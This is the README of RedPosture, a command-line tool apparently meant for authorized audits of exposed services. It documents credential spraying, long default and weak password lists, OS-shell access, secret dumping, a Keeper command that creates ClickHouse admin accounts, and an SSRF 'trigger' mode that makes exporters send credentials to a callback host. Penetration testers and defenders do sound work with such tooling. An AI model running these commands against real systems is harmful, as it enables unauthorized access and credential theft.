<p align="center">
  <a href="https://deepwiki.com/MelForze/Redposture">
    <img src="https://deepwiki.com/badge.svg" alt="Ask DeepWiki">
  </a>
  <a href="https://github.com/MelForze/Redposture/blob/main/LICENSE">
    <img src="https://img.shields.io/github/license/MelForze/Redposture?style=flat-square" alt="License">
  </a>
  <a href="https://github.com/MelForze/Redposture/actions/workflows/ci.yml">
    <img src="https://img.shields.io/github/actions/workflow/status/MelForze/Redposture/ci.yml?branch=main&style=flat-square&label=CI" alt="CI">
  </a>
  <a href="https://github.com/MelForze/Redposture/releases">
    <img src="https://img.shields.io/github/v/tag/MelForze/Redposture?style=flat-square&label=version" alt="Latest version">
  </a>
  <img src="https://img.shields.io/badge/modules-25-2b2f36?style=flat-square" alt="Modules">
  <img src="https://img.shields.io/badge/Python-3.12%2B-2b2f36?style=flat-square" alt="Python 3.12+">
  <img src="https://img.shields.io/badge/install-pipx-2b2f36?style=flat-square" alt="Install with pipx">
</p>


# RedPosture

CLI for authorized audits of exposed services: identify the product, verify access,
enumerate data, find secrets, and match versions against an offline CVE catalog.
Python 3.12+; 25 audit modules, credential spray, and exporter scan/collect/trigger workflows.

## Install

```bash
pipx install "git+https://github.com/MelForze/Redposture.git"
redposture --version
```

## Usage

- `-t`: host, URL, CIDR, IPv4 range, comma-separated list or target file; `--port`:
  port, list or range. `-ot, --out-target` accepts exclusions in the same formats:
  `--out-target exclusions.txt` removes matching hosts before ports are expanded.
- `-u/-p`, module-specific token flags or `--defcreds` perform real login checks.
  `-o results.txt` writes TXT, `-f json` writes structured results, and `--debug`
  shows diagnostics. See `redposture <module> -h` for all flags.

TXT shows confirmed services only. Generic login/SSO pages, HTTP status codes and
an isolated `version` field do not confirm a product or start auth, discovery or CVE
checks. Unconfirmed results and pre-detection errors remain in debug/JSON. JSON
includes `detection_status` (`confirmed`, `probable`, `not_service`,
`transport_failure`), `detection_signals` and any older `detection_detail_status`.
With no confirmed service, one `No MODULE service detected` line includes the
unreachable count; if nonzero it uses `[!]` and exits nonzero. Post-detection
errors stay visible.
SSO appears as `auth required:sso`; verified/rejected credentials use `[+]`/`[-]`.
Inconclusive pairs appear only in debug/JSON.

Main workers: 64 for fewer than 1000 expanded `host:port` tasks, otherwise 128
(`-w` overrides). Shared nested workers: 32/64, capped by `-w`; per-target discovery
limits are MinIO/Elastic/Proxmox 8 and ClickHouse 4 (`max_threads=1` per query).
Audit targets stream continuously through a bounded queue. Multi-target scans show
address and `host:port` counts by port before starting; this plan stays out of
saved TXT/JSON. Exporters use separate schedulers.

Postgres and ClickHouse `--os-shell` show command exit status and separate
stdout/stderr. Binary output gets a safe hex preview; use `:hex [stdout|stderr]
[bytes]`, `:base64 [stdout|stderr] [bytes]`, or `:save [stdout|stderr]
<local-path>` for captured bytes. `:limit 16M` changes the per-stream capture
budget (default 8 MiB, maximum 50 MiB); `:help` lists local commands.
`:save` never overwrites an existing file. A truncated capture is marked
partial, and an interrupted command is never replayed automatically.
Docker/KubeAPI exec include Base64 fields in JSON for binary output; Oracle
Scheduler captures at most 8 KiB per stream when readback is available.

`--discover` covers Airflow, MinIO, Elastic/OpenSearch, ClickHouse and Proxmox.
The default budget is 50 MiB per target. Only Elastic/OpenSearch has a default
deadline (300 s); other modules have no default time or item cap. Use
`--discover-max-bytes`/`--discover-time` to override.
Findings stream live; incomplete scans are marked partial. ClickHouse supports
`--checkpoint`/`--resume`.

HTTP checks may follow redirects across scheme, host and port with supplied
credentials. The URL scheme selects the first attempt; a canonical HTTP 400
requiring HTTPS retries safe GET/HEAD discovery. Later checks reuse the resolved
origin, while changing requests are not replayed
to select a scheme. Target TLS accepts self-signed certificates by default;
where supported, a CA file enables certificate and hostname verification. mTLS
needs a client certificate and key. For a reverse proxy, supply its mounted URL (for example
`https://host/airflow/api/v1/version`) and the DNS name required for Host/SNI;
the module retains the URL prefix after removing a known API suffix.

`spray` checks supplied pairs or tokens only after a module confirms the product.
It does not run inventory, discovery, or CVE checks. A bare host uses the selected
modules' normal ports; a URL or `host:port` keeps its explicit port.

```bash
redposture spray -t targets.txt --modules airflow,grafana --pairs pairs.txt -o spray.txt
redposture spray -t targets.txt --modules keycloak,kubeapi --tokens tokens.txt --checkpoint spray.sqlite3 -o spray-tokens.txt
redposture spray -t targets.txt --modules all --users users.txt --passwords passwords.txt --origin-rate 2 --account-interval 60 -o spray-all.txt
redposture spray -t targets.txt --modules all --users users.txt --passwords passwords.txt --origin-rate 2 --account-interval 60 --checkpoint spray-all.txt.checkpoint.sqlite3 --resume -o spray-all.txt
```

Pairs use the first colon as separator. The users/passwords combination tries
each password across all users before the next password. Results and the raw
secrets appear in terminal, TXT, and JSON as requested; output and checkpoint
files are mode `0600`. A begun attempt interrupted before its result becomes
`inconclusive` on resume and is not retried. `--module-config` accepts only
auth/transport settings, such as `{"keeper":{"znode":"/protected"}}` or
`{"keycloak":{"realm":"master"}}`; action flags are rejected. Docker Engine
pairs and Keycloak pairs report `unsupported` because those modules cannot
verify them. `redposture spray -h` lists all options.

## Default credentials checked by `--defcreds`

| Module | Credential pairs checked |
| --- | --- |
| Grafana | `admin:admin`, `admin:changeme`, `admin:grafana`, `admin:password`, `grafana:grafana`, `grafana:password`, `root:password`, `root:root`, `user:password`, `user:user`, `admin:12345678` |
| MinIO | `minioadmin:minioadmin`, `minio:minio123`, `minioadmin:minio123`, `minioadmin:password`, `admin:admin`, `admin:minioadmin`, `admin:password`, `root:minioadmin`, `root:password`, `minio:minio`, `access:secret`, `minioadmin:12345678` |
| Proxmox | `admin@pam:admin`, `admin@pve:admin`, `admin@pve:password`, `root@pam:admin`, `root@pam:changeme`, `root@pam:password`, `root@pam:proxmox`, `root@pam:Proxmox123`, `root@pam:root`, `root@pam:toor`, `root@pam:12345678` |
| Postgres | `admin:admin`, `admin:password`, `admin:postgres`, `dev:dev`, `pgbouncer:pgbouncer`, `pgbouncer_exporter:pgbouncer_exporter`, `pgsql:pgsql`, `postgres:admin`, `postgres:changeme`, `postgres:password`, `postgres:postgres`, `service:service`, `test:test`, `user:password`, `user:user`, `postgres:12345678` |
| MongoDB | `admin:admin`, `admin:changeme`, `admin:mongo`, `admin:mongodb`, `admin:password`, `dev:dev`, `mongo:mongo`, `mongo:password`, `mongodb:mongodb`, `mongodb:password`, `root:admin`, `root:mongo`, `root:mongodb`, `root:password`, `root:root`, `test:test`, `user:password`, `user:user`, `admin:12345678` |
| Oracle | `admin:admin`, `admin:changeme`, `admin:oracle`, `admin:password`, `dbsnmp:dbsnmp`, `dev:dev`, `hr:hr`, `outln:outln`, `pdbadmin:oracle`, `pdbadmin:pdbadmin`, `scott:scott`, `scott:tiger`, `sys:change_on_install`, `sys:oracle`, `sys:sys`, `system:manager`, `system:oracle`, `system:system`, `test:test`, `user:user`, `system:12345678` |
| ClickHouse | `admin:admin`, `admin:changeme`, `admin:password`, `clickhouse:clickhouse`, `clickhouse:password`, `default:<empty>`, `default:changeme`, `default:clickhouse`, `default:default`, `default:password`, `root:password`, `root:root`, `user:password`, `user:user`, `default:12345678` |
| Redis | `admin:admin`, `admin:changeme`, `admin:password`, `default:changeme`, `default:default`, `default:password`, `default:redis`, `dev:dev`, `redis:changeme`, `redis:password`, `redis:redis`, `root:password`, `root:root`, `service:service`, `test:test`, `user:password`, `user:user`, `default:12345678` |
| etcd | `admin:admin`, `admin:changeme`, `admin:etcd`, `admin:password`, `etcd:etcd`, `etcd:password`, `root:admin`, `root:etcd`, `root:password`, `root:root`, `root:rootpass`, `service:service`, `user:password`, `user:user`, `root:12345678` |
| Elastic/OpenSearch | `admin:admin`, `admin:changeme`, `admin:password`, `elastic:changeme`, `elastic:elastic`, `elastic:password`, `kibana:changeme`, `kibana:kibana`, `logstash:logstash`, `logstash_system:changeme`, `opensearch:opensearch`, `opensearch:password`, `admin:12345678`, `elastic:12345678` |
| gRPC | Basic: `admin:admin`, `admin:changeme`, `admin:password`, `dev:dev`, `grpc:admin`, `grpc:grpc`, `grpc:password`, `guest:guest`, `root:admin`, `root:password`, `root:root`, `service:password`, `service:service`, `test:test`, `user:password`, `user:user`, `admin:12345678`.<br>Bearer tokens: `admin`, `changeme`, `default-token`, `grpc`, `secret`, `token`. |
| Kafka | `admin:admin`, `admin:admin-secret`, `admin:changeme`, `admin:kafka`, `admin:password`, `broker:broker`, `broker:brokerpass`, `client:client`, `kafka:admin`, `kafka:changeme`, `kafka:kafka`, `kafka:password`, `kafka:zookeeper`, `service:password`, `service:service`, `user:password`, `user:user`, `admin:12345678` |
| ZooKeeper | `admin:admin`, `admin:changeme`, `admin:kafka`, `admin:password`, `admin:zookeeper`, `broker:broker`, `broker:brokerpass`, `client:client`, `dev:dev`, `guest:guest`, `hadoop:hadoop`, `kafka:changeme`, `kafka:kafka`, `kafka:password`, `kafka:zookeeper`, `root:admin`, `root:password`, `root:root`, `root:rootpass`, `root:zookeeper`, `service:password`, `service:service`, `solr:solr`, `super:super`, `test:test`, `user:password`, `user:user`, `user1:12345`, `zk:password`, `zk:zk`, `zk:zookeeper`, `zookeeper:admin`, `zookeeper:password`, `zookeeper:zookeeper`, `admin:12345678` |
| Keeper | `admin:admin`, `admin:changeme`, `admin:clickhouse`, `admin:keeper`, `admin:password`, `clickhouse:changeme`, `clickhouse:clickhouse`, `clickhouse:keeper`, `clickhouse:password`, `default:<empty>`, `default:changeme`, `default:clickhouse`, `default:default`, `default:password`, `keeper:changeme`, `keeper:clickhouse`, `keeper:keeper`, `keeper:password`, `root:clickhouse`, `root:keeper`, `root:password`, `root:root`, `service:password`, `service:service`, `user:password`, `user:user`, `default:12345678` |
| Airflow | `airflow:airflow`, `admin:admin`, `admin:airflow`, `airflow:admin`, `airflow:password`, `airflow:changeme`, `airflow:airflow123`, `admin:password`, `admin:changeme`, `admin:airflow123`, `root:root`, `root:password`, `user:user`, `user:password`, `test:test`, `dev:dev`, `service:service`, `guest:guest`, `admin:12345678` |
| GitLab | `root:root`, `root:password`, `root:admin`, `root:changeme`, `root:gitlab`, `root:admin123`, `admin:admin`, `admin:password`, `admin:changeme`, `admin:gitlab`, `gitlab:gitlab`, `gitlab:password`, `gitlab:admin`, `user:user`, `user:password`, `test:test`, `guest:guest`, `dev:dev`, `root:12345678` |
| Harbor | `admin:Harbor12345`, `admin:harbor`, `admin:harbor123`, `admin:Harbor123`, `harbor:harbor`, `harbor:password`, then `admin:admin`, `admin:password`, `admin:changeme`, `admin:admin123`, `admin:123456`, `root:root`, `root:password`, `root:admin`, `root:changeme`, `user:user`, `user:password`, `test:test`, `guest:guest`, `dev:dev`, `service:service`, `admin:12345678` |
| Nexus | `admin:admin123`, `nexus:nexus`, `admin:nexus`, `admin:nexus123`, `admin:sonatype`, `nexus:password`, `nexus:admin`, then `admin:admin`, `admin:password`, `admin:changeme`, `admin:123456`, `root:root`, `root:password`, `root:admin`, `root:changeme`, `user:user`, `user:password`, `test:test`, `guest:guest`, `dev:dev`, `service:service`, `admin:12345678` |
| Docker Registry | `registry:registry`, `registry:password`, `registry:admin`, `registry:changeme`, `registry:registry123`, `docker:docker`, `docker:password`, then `admin:admin`, `admin:password`, `admin:changeme`, `admin:admin123`, `admin:123456`, `root:root`, `root:password`, `root:admin`, `root:changeme`, `user:user`, `user:password`, `test:test`, `guest:guest`, `dev:dev`, `service:service`, `admin:12345678` |
| KubeAPI | `admin:admin`, `admin:password`, `root:root`, `root:password`, `kubeadmin:kubeadmin`, `kubernetes:kubernetes`, `user:user`, `test:test`, `admin:12345678` |
| RabbitMQ | `admin:admin`, `admin:changeme`, `admin:password`, `admin:rabbitmq`, `guest:guest`, `guest:password`, `rabbitmq:admin`, `rabbitmq:password`, `rabbitmq:rabbitmq`, `root:password`, `root:root`, `service:password`, `service:service`, `test:test`, `user:password`, `user:user`, `admin:12345678` |

These are weak-password candidates, not universal factory passwords: [Harbor](https://goharbor.io/docs/edge/install-config/run-installer-script/)
documents `admin:Harbor12345`, while [GitLab](https://docs.gitlab.com/install/next_steps/)
and [Nexus](https://help.sonatype.com/en/install-nexus-repository.html) generate installation-specific
passwords. [Kubernetes](https://kubernetes.io/docs/reference/access-authn-authz/authentication/)
has no universal Basic pair; KubeAPI tries candidates only when Basic is advertised.
Neither public `/v2/` nor HTTP 200 proves registry authentication. Inconclusive
checks stay in debug/JSON; rate limiting or account lock stops the credential sweep.
The eight-digit numeric candidate is a weak password, not a product default.

## Module Examples

Each block has three independent commands. Replace hosts and credentials;
`targets.txt` has one target per line. Keeper/ZooKeeper credential checks need an
ACL-protected verifier znode (`--znode /app`). Explicit write/exec/SSRF actions
are omitted.

### Airflow

```bash
redposture airflow -t targets.txt --enum-cve
redposture airflow -t targets.txt --defcreds
redposture airflow -t https://airflow.example:8080 -u auditor -p 'password' --show-keys --show-connections --discover
```

Airflow reports anonymous `Dags/Keys/Connections allowed` separately from access
after login; live output follows service → credentials → CVE → keys → connections → discovery.

### ClickHouse

```bash
redposture clickhouse -t targets.txt --enum-cve
redposture clickhouse -t targets.txt --defcreds
redposture clickhouse -t db.example -u auditor -p 'password' --show-databases --show-tables --discover
```

### Consul

```bash
redposture consul -t targets.txt --enum-cve
redposture consul -t http://consul.example:8500 --keys --services --agents
redposture consul -t http://consul.example:8500 --token "$CONSUL_TOKEN" --key app/config --dump
```

### Docker

```bash
redposture docker -t targets.txt --enum-cve
redposture docker -t http://docker.example:2375 --containers --images --system
redposture docker -t https://docker.example:2376 --tls-ca ca.pem --tls-cert client.pem --tls-key client.key --containers
```

### Elastic / OpenSearch

```bash
redposture elastic -t targets.txt --enum-cve
redposture elastic -t targets.txt --defcreds
redposture elastic -t https://search.example:9200 -u auditor -p 'password' --cluster --user --discover
```

### etcd

```bash
redposture etcd -t targets.txt --enum-cve
redposture etcd -t targets.txt --defcreds
redposture etcd -t http://etcd.example:2379 -u root -p 'password' --show-keys 20 --dump 10
```

### GitLab

```bash
redposture gitlab -t https://gitlab.example --enum-cve
redposture gitlab -t https://gitlab.example --defcreds
redposture gitlab -t https://gitlab.example --token "$GITLAB_TOKEN" --registry-token "$REGISTRY_TOKEN" --images
```

GitLab detects web/API and Container Registry separately: `--token` is for web/API,
`--registry-token` for OCI; JSON nests OCI data in `container_registry`. Web login
uses a fresh CSRF session per pair and stops at SSO, CAPTCHA or rate limiting.
GitLab, Harbor, Nexus and Docker Registry show one product line followed by
credentials and requested inventory. Output files contain four tab-separated
fields without ANSI. `version:unknown` means no server version was disclosed;
the OCI `registry/2.0` header is a protocol version, not a server release.

### Grafana

```bash
redposture grafana -t targets.txt --enum-cve
redposture grafana -t targets.txt --defcreds
redposture grafana -t https://grafana.example -u auditor -p 'password' --show-datasources --enum-cve
```

The public `/api/health` identifies Grafana and its version, but anonymous
access is determined from a protected API resource.

### Keycloak

```bash
redposture keycloak -t targets.txt --enum-cve
redposture keycloak -t https://id.example/auth --enum-realms
redposture keycloak -t https://id.example --token-file token.txt --show-realms --show-clients
```

Keycloak requires a product-specific realm response and matching OIDC discovery;
generic SSO pages are at most `probable` in debug/JSON. The Admin API supplies an exact
version only when accessible. `--enum-cve` never guesses from a UI theme or URL.
The public `master` realm is checked by default; `--realm` is repeatable and
`--enum-realms` checks up to 32 common names and reports only realms confirmed by
the public Keycloak and OIDC endpoints. With an authorized token, `--show-realms`
reports brute-force protection, registration, HTTPS requirement and password policy;
`--show-clients` reports client type, Direct Access Grants, implicit flow, redirect
URIs and web origins. Denied or absent settings remain `unknown` rather than `False`.
Admin inventory uses GET requests and never prints client secrets.

### gRPC

```bash
redposture grpc -t targets.txt --analyze
redposture grpc -t grpc.example --token "$GRPC_TOKEN" --openapi
redposture grpc -t grpc.example --invoke /grpc.health.v1.Health/Check --data '{"service":""}'
```

### Kafka

```bash
redposture kafka -t targets.txt --show-topics
redposture kafka -t targets.txt --defcreds
redposture kafka -t kafka.example -u auditor -p 'password' --topic events --dump 10
redposture kafka -t kafka.example -u producer -p 'password' --topic audit.events --write-message 'test event'
```

`--probe-write` works alone or with `--topic NAME`; it appends one audit marker to each probed topic. An inconclusive result is shown as `write:unknown`.
`--write-message` sends one UTF-8 record; `--write-file` sends one binary record (up to 1 MiB). Both require `--topic`, and `--write-key` is optional. A lost broker acknowledgment is reported as unconfirmed and never retried, because the record may already be present.

### Keeper

```bash
redposture keeper -t targets.txt
redposture keeper -t targets.txt --defcreds --znode /app
redposture keeper -t keeper.example -u auditor -p 'password' --show-znodes 20 --dump 10
```

Keeper reports `(ddl access:Write/Read/Denied/Absent/Unknown)` for anonymous access
to `/clickhouse/task_queue/ddl`. By default it reads the path and creates/deletes
an empty ephemeral child that is **not** a DDL task. `Write` proves a znode write,
not SQL execution; `Read` leaves write access unproved; `Absent` can also mean a
custom DDL path. The probe can trigger Keeper watches. `--probe-write` separately
tests create/delete under `/`.

`--show-cluster` and `--show-hosts` read existing DDL tasks (formats 5–8). For
`--create-user NAME --create-userpass PASSWORD`, Keeper uses worker IDs and a
cluster from the newest valid task, queues a SHA-256-hashed `CREATE USER`, and
reports success only after a worker confirms it. New tasks use minimal format 5
without inheriting settings or initiator identity. `--grant-admin` then queues a
separate `GRANT ALL ON *.* WITH GRANT OPTION` after successful creation.
These operations change ClickHouse accounts:

```bash
redposture keeper -t keeper.example:9181 --create-user audituser --create-userpass 'strong-password' --grant-admin
```

Interactive mode requires one target and a terminal: choose clusters/workers by
number or `a` for all, then confirm creation and each grant with `y`. Blank,
`n`, EOF or Ctrl-C declines; selecting only some workers warns and affects only
them.
The password is not printed. `--yes` skips menus/prompts and can affect multiple
targets; with multiple clusters, specify `--clickhouse-cluster`. If no usable DDL
task exists, set `--clickhouse-host` and `--clickhouse-cluster` (optional
`--clickhouse-port`, default 9000). A queue over 512 tasks also requires explicit
host/cluster. Keeper never guesses ClickHouse hosts from its own IP, replica names,
sessions, discovery paths or peers. `{cluster}` expands only when configured in
ClickHouse; Redposture does not substitute it in DDL tasks.

### KubeAPI

```bash
redposture kubeapi -t targets.txt --enum-cve
redposture kubeapi -t https://cluster.example:6443 --defcreds
redposture kubeapi -t https://cluster.example:6443 --token "$KUBE_TOKEN" --secrets
```

### MinIO

```bash
redposture minio -t targets.txt --enum-cve
redposture minio -t targets.txt --defcreds
redposture minio -t https://minio.example:9000 -u minioadmin -p 'password' --show-buckets --show-objects --discover
```

### MongoDB

```bash
redposture mongodb -t targets.txt --enum-cve
redposture mongodb -t targets.txt --defcreds
redposture mongodb -t mongo.example -u auditor -p 'password' --show-databases --show-collections
```

### Oracle

```bash
redposture oracle -t targets.txt --listener-dump
redposture oracle -t oracle.example --service ORCLPDB1 --defcreds
redposture oracle -t oracle.example --service ORCLPDB1 -u auditor -p 'password' --show-schemas --show-tables --privesc-check
```

Oracle reuses the confirmed listener/service for credential checks. Its automatic limit is 8 concurrent targets; explicit `--workers` overrides it. `--defcreds` still checks every candidate, except further passwords for an account reported locked.

### PostgreSQL

```bash
redposture postgres -t targets.txt --enum-cve
redposture postgres -t targets.txt --defcreds --stop-on-success
redposture postgres -t db.example -u auditor -p 'password' --show-databases --show-tables --privesc-check
```

### Proxmox

```bash
redposture proxmox -t targets.txt --enum-cve
redposture proxmox -t targets.txt --defcreds
redposture proxmox -t https://pve.example:8006 -u auditor@pve -p 'password' --nodes --discover
```

Without supplied credentials, a protected API does not produce token or password failure lines.

### Qdrant

```bash
redposture qdrant -t targets.txt --enum-cve
redposture qdrant -t http://qdrant.example:6333 --collections
redposture qdrant -t http://qdrant.example:6333 --api-key "$QDRANT_API_KEY" --collection documents --dump 10
```

### RabbitMQ

```bash
redposture rabbitmq -t targets.txt --enum-cve
redposture rabbitmq -t targets.txt --defcreds
redposture rabbitmq -t http://rabbitmq.example:15672 -u auditor -p 'password' --enum
```

### Redis / Valkey

```bash
redposture redis -t targets.txt --enum-cve
redposture redis -t targets.txt --defcreds
redposture redis -t redis.example -u auditor -p 'password' --show-keys 20 --dump 10
```

### Harbor

```bash
redposture harbor -t https://harbor.example --enum-cve
redposture harbor -t https://harbor.example --defcreds
redposture harbor -t https://harbor.example -u auditor -p 'password' --images
```

### Nexus

```bash
redposture nexus -t https://nexus.example --enum-cve
redposture nexus -t https://nexus.example --defcreds
redposture nexus -t https://nexus.example -u auditor -p 'password' --assets
```

### Docker Registry

```bash
redposture docker-registry -t https://registry.example --enum-cve
redposture docker-registry -t https://registry.example --defcreds
redposture docker-registry -t https://registry.example -u auditor -p 'password' --images
```

`docker-registry` accepts only a plain OCI Registry fingerprint. Harbor, Nexus and
GitLab require their product commands. Image, tag, metadata and download options
are available on each product command; inaccessible inventory sections are omitted.
On a protected `/v2/`, Basic pairs are checked even if the auth challenge is absent;
only definitive results are printed.

### ZooKeeper

```bash
redposture zookeeper -t targets.txt --enum-cve
redposture zookeeper -t targets.txt --defcreds --znode /app
redposture zookeeper -t zk.example -u auditor -p 'password' --show-znodes 20 --dump 10
```

### Exporters

```bash
redposture exporters scan -t targets.txt
redposture exporters collect -t targets.txt --deep
redposture exporters trigger -t targets.txt --callback-dns callback.example
```

Trigger supports Redis, Postgres, Blackbox, Proxmox, MySQL, JSON, Elasticsearch,
SNMP and IPMI exporters. All nine callback listeners start by default; `-e` selects
exporter types and matching listeners, while `-s` selects listeners explicitly.
Exporter HTTPS accepts self-signed certificates unless `--tls-ca file` is supplied.
`--no-postgres-tls` disables Postgres callback TLS; `--no-with-listen` skips
listeners. SNMP/IPMI use UDP. A trigger is confirmed only when its listener
observes a callback. Percona MongoDB exporter is excluded: its `/scrape?target=`
selects only preconfigured `--mongodb.uri` hosts.

Trigger tries a default probe and a paced, bounded list of named profiles
(`auth_module`, `module`, or SNMP `auth`) serially, continuing after callbacks
because another profile may carry credentials. Repeated exporter errors stop the
sweep. Use `--profiles-file` or exporter-specific flags such as
`--mysql-auth-module`, `--elastic-auth-module` and `--snmp-auth` for custom
profiles; Redis has no named profile. `CRED!` requires credential material
actually received, not just SSRF. HTTP callbacks may carry Basic/Bearer/API keys;
MySQL `mysql_native_password` yields a challenge-bound username, `auth_salt` and
`auth_response` challenge response, never the plaintext password. SNMPv1/v2c
yields a community;
SNMPv3/IPMI confirm SSRF without claiming a password. `-check` can verify captured
Redis/Postgres credentials.

## Offline CVE enumeration

`--enum-cve` compares confirmed products and exact versions with a bundled offline
catalog; it makes no external requests or exploit attempts. Findings mean
**potentially affected**, not proof of exploitability: backports and deployment settings matter.
The catalog mainly covers High/Critical network CVEs with reliable version ranges
for code execution, auth bypass, takeover, data/file access or SSRF, excluding
pure DoS. `PR:L` normally needs anonymous access or verified **explicit** credentials;
invalid credentials and `--defcreds` alone do not qualify. Selected Nexus
script/licensing entries need elevated permissions, and Grafana Image Renderer
needs a detected plugin and reachable renderer; other title prerequisites such as
Enterprise SCIM or a write-enabled MinIO key are not proven by version matching.
The Keycloak JWT grant entry additionally requires valid client credentials;
a verified bearer token alone does not prove that prerequisite.

Credential checks precede newest-first CVE findings. With an unknown or malformed
version, a confirmed product shows catalogued CVEs from the last four years as
yellow speculative findings: `Possibly CVE-… may affect this service`.
This does not establish that its installed version is vulnerable. When a catalog
entry has a publication date, the rolling four-year cutoff uses it. Otherwise
the CVE ID year is used only when the entire year is inside that window; undated
entries from the boundary year are omitted. `PR:L` still requires confirmed
anonymous access or verified explicit credentials; entries requiring elevated
permissions are omitted from unknown-version findings. A known vulnerable version
continues to use the red `[!]` marker and `potentially affected` wording.
`CVE's Enumeration` appears only when there are findings; otherwise status and
reason remain in debug/JSON.

```text
GRAFANA         10.0.0.1        3000  [*] Grafana Service (auth required:False) (version:8.2.6)
GRAFANA         10.0.0.1        3000  [*] CVE's Enumeration
GRAFANA         10.0.0.1        3000  [!] CVE-2021-43798 potentially affected (HIGH 7.5) Unauthenticated path traversal and arbitrary file read
```

The bundled `2026-10-06` catalog contains 200 reviewed product/CVE records:

| Product | CVEs | Product | CVEs |
|---|---:|---|---:|
| GitLab | 72 | Redis | 23 |
| PostgreSQL | 23 | Airflow | 11 |
| Grafana | 11 | Elasticsearch | 6 |
| MongoDB | 7 | MinIO | 5 |
| Nexus Repository | 10 | Qdrant | 5 |
| RabbitMQ | 4 | ClickHouse | 3 |
| Valkey | 3 | ZooKeeper | 2 |
| Harbor | 2 | Oracle Database | 2 |
| OpenSearch | 1 | Proxmox VE | 1 |
| Grafana Enterprise SCIM | 1 | Grafana Image Renderer | 1 |
| Consul | 1 | Docker Engine | 1 |
| etcd | 1 | Kubernetes | 1 |
| Keycloak | 3 | | |
| **Total** | **200** | | |

Elasticsearch/OpenSearch, Redis/Valkey, ZooKeeper/Keeper and Registry vendors are
matched separately. Plain Docker Registry and gRPC are unsupported; Kafka lacks
an exact broker version, and Keeper has no catalog matches. Version access may
require auth; Oracle needs the Database version, not the listener version.
`-f json` includes ranges, fixes, CVSS and references in `cve_enumeration`.

## Development and checks

```bash
git clone https://github.com/MelForze/Redposture.git
cd Redposture
python -m venv .venv
source .venv/bin/activate
pip install -e '.[dev]'
pytest
./scripts/check_ci_matrix.sh --worktree
```

CI locks are in `requirements/` (`scripts/update_ci_locks.sh`). Full QA and
selected sections use the same local runner:

```bash
./scripts/run_full_local_qa.sh --list
./scripts/run_full_local_qa.sh /tmp/redposture_qa_fuzz --section cli-fuzz,hypothesis
./scripts/run_full_local_qa.sh /tmp/redposture_qa_full
```

Each section writes its own log and summary; Docker is required only for Docker
sections. `./scripts/run_qa_handoff.sh versions` runs the separate version
matrix. `./scripts/run_http_detection_qa.sh` writes a focused report under
`.redposture/qa/`. `lab/`, `lab_tests/`, `qa_tests/` and `.redposture/` are
excluded from Git.

## License

[MIT](LICENSE).
